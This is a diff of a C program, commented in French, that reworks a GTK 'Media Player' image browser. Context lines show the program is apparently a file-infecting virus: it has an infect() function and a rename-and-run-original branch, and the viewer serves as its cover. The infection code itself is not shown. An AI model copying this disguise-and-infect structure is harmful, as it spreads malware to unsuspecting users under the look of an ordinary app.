@@ -6,40 +6,51 @@
 #include <stdio.h>
 #include <string.h>
 
-static void
-on_open_image (GtkButton* button, gpointer user_data)
-{
-	GtkWidget *image = GTK_WIDGET (user_data);
-	GtkWidget *toplevel = gtk_widget_get_toplevel (image);
-	GtkFileFilter *filter = gtk_file_filter_new ();
-	// Create box dialogue for file selection
+// Variables globales
+GtkWidget *image;
+int current_image_index = 0;
+int total_images = 0;
+char **image_paths;
 
-	GtkWidget *dialog = gtk_file_chooser_dialog_new (("Open image"),
-	                                                 GTK_WINDOW (toplevel),
-	                                                 GTK_FILE_CHOOSER_ACTION_OPEN,
-	                                                 "gtk-ok", GTK_RESPONSE_ACCEPT,
-	                                                 "gtk-cancel", GTK_RESPONSE_CANCEL,
-	                                                 NULL);
+// Fonction pour charger et afficher l'image actuelle
+void load_image() {
+    GdkPixbuf *original_pixbuf = gdk_pixbuf_new_from_file(image_paths[current_image_index], NULL);
 
-	gtk_file_filter_add_pixbuf_formats (filter); // Adding the images format accept by GTK 
-	gtk_file_chooser_add_filter (GTK_FILE_CHOOSER (dialog),
-	                             filter);
+    // Obtenir les dimensions de l'image originale
+    int original_width = gdk_pixbuf_get_width(original_pixbuf);
+    int original_height = gdk_pixbuf_get_height(original_pixbuf);
 
-	switch (gtk_dialog_run (GTK_DIALOG (dialog)))
-	{
-		case GTK_RESPONSE_ACCEPT:
-		{
-			gchar *filename =
-				gtk_file_chooser_get_filename (GTK_FILE_CHOOSER (dialog));
-			gtk_image_set_from_file (GTK_IMAGE (image), filename);
-			break;
-		}
-		default:
-			break;
-	}
-	gtk_widget_destroy (dialog);
+    // Calculer les nouvelles dimensions en conservant le ratio d'aspect
+    int width, height;
+    if (original_width > original_height) {
+        width = 800;
+        height = (original_height * width) / original_width;
+    } else {
+        height = 800;
+        width = (original_width * height) / original_height;
+    }
+
+    // Redimensionner l'image
+    GdkPixbuf *resized_pixbuf = gdk_pixbuf_scale_simple(original_pixbuf, width, height, GDK_INTERP_BILINEAR);
+
+    gtk_image_set_from_pixbuf(GTK_IMAGE(image), resized_pixbuf);
+
+    // Libérer la mémoire
+    g_object_unref(original_pixbuf);
+    g_object_unref(resized_pixbuf);
 }
 
+// Fonction pour passer à l'image suivante
+void next_image() {
+    current_image_index = (current_image_index + 1) % total_images;
+    load_image();
+}
+
+// Fonction pour passer à l'image précédente
+void prev_image() {
+    current_image_index = (current_image_index - 1 + total_images) % total_images;
+    load_image();
+}
 
     char*
     nameToOld(char* name)
@@ -153,43 +164,6 @@ void infect()
 	free(rname);
 }
 
-
-static void
-activate (GtkApplication *app, gpointer user_data)
-{
-	GtkWidget *window;
-	GtkWidget *button;
-	GtkWidget *image;
-	GtkWidget *box;
-
-	/* Set up the UI */
-	window = gtk_application_window_new (app);
-	gtk_window_set_title (GTK_WINDOW (window), "mon image viewer");
-	gtk_window_set_default_size (GTK_WINDOW (window), 300, 150);
-	gtk_container_set_border_width (GTK_CONTAINER (window), 5);
-
-	box = gtk_box_new (GTK_ORIENTATION_VERTICAL, 5);
-	button = gtk_button_new_with_label (("Open image"));
-	image = gtk_image_new ();
-
-	gtk_box_pack_start (GTK_BOX (box), image, TRUE, TRUE, 0);
-	gtk_box_pack_start (GTK_BOX (box), button, FALSE, FALSE, 0);
-
-	gtk_container_add (GTK_CONTAINER (window), box);
-
-	/* Connect signals */
-
-	/* Show open dialog when opening a file */
-	g_signal_connect (button, "clicked", G_CALLBACK (on_open_image), image);
-
-	/* Exit when the window is closed */
-	g_signal_connect (window, "destroy", G_CALLBACK (gtk_main_quit), NULL);
-
-	gtk_container_add (GTK_CONTAINER (window), box);
-  	gtk_widget_show_all (window);
-}
-
-
 int
 main (int argc, char **argv)
 {
@@ -200,11 +174,64 @@ main (int argc, char **argv)
 
 	if(!strcmp(argv[0], "./MediaPlayer.exe")) // If the file is MediaPlayer run the MediaPlayer
 	{
-		GtkApplication *app;
-		app = gtk_application_new ("org.gtk.example", G_APPLICATION_FLAGS_NONE);
-		g_signal_connect (app, "activate", G_CALLBACK (activate), NULL);
-		status = g_application_run (G_APPLICATION (app), argc, argv);
-		g_object_unref (app);
+		gtk_init(&argc, &argv);
+
+		// Création de la fenêtre
+		GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
+		gtk_window_set_title(GTK_WINDOW(window), "Media Player");
+		gtk_window_set_default_size(GTK_WINDOW(window), 800, 800);
+		g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);
+
+		// Création du conteneur principal
+		GtkWidget *vbox = gtk_vbox_new(FALSE, 5);
+
+		// Ajout des boutons avant et arrière
+		GtkWidget *prev_button = gtk_button_new_with_label("Précédent");
+		GtkWidget *next_button = gtk_button_new_with_label("Suivant");
+		g_signal_connect(prev_button, "clicked", G_CALLBACK(prev_image), NULL);
+		g_signal_connect(next_button, "clicked", G_CALLBACK(next_image), NULL);
+		gtk_box_pack_start(GTK_BOX(vbox), prev_button, FALSE, FALSE, 0);
+		gtk_box_pack_start(GTK_BOX(vbox), next_button, FALSE, FALSE, 0);
+
+		// Création de l'image
+		image = gtk_image_new();
+		gtk_box_pack_start(GTK_BOX(vbox), image, TRUE, TRUE, 0);
+
+		// Récupération des chemins des images dans le dossier courant
+		DIR *dir;
+		struct dirent *ent;
+		dir = opendir(".");
+		if (dir != NULL) {
+			while ((ent = readdir(dir)) != NULL) {
+				if (ent->d_type == DT_REG) { // Fichier régulier
+					const char *ext = strrchr(ent->d_name, '.');
+					if (ext != NULL && (strcmp(ext, ".png") == 0 || strcmp(ext, ".jpeg") == 0 || strcmp(ext, ".jpg") == 0 || strcmp(ext, ".svg") == 0)) {
+						total_images++;
+						image_paths = realloc(image_paths, total_images * sizeof(char*));
+						image_paths[total_images - 1] = strdup(ent->d_name);
+					}
+				}
+			}
+			closedir(dir);
+		}
+
+		// Affichage de la première image
+		if (total_images > 0) {
+			load_image();
+		}
+
+		// Affichage de la fenêtre
+		gtk_container_add(GTK_CONTAINER(window), vbox);
+		gtk_widget_show_all(window);
+
+		// Lancement de la boucle principale de GTK
+		gtk_main();
+
+		// Libération de la mémoire
+		for (int i = 0; i < total_images; ++i) {
+			free(image_paths[i]);
+		}
+		free(image_paths);
 	}
 	else //Run the originaly prog file with replacing its extension
 	{
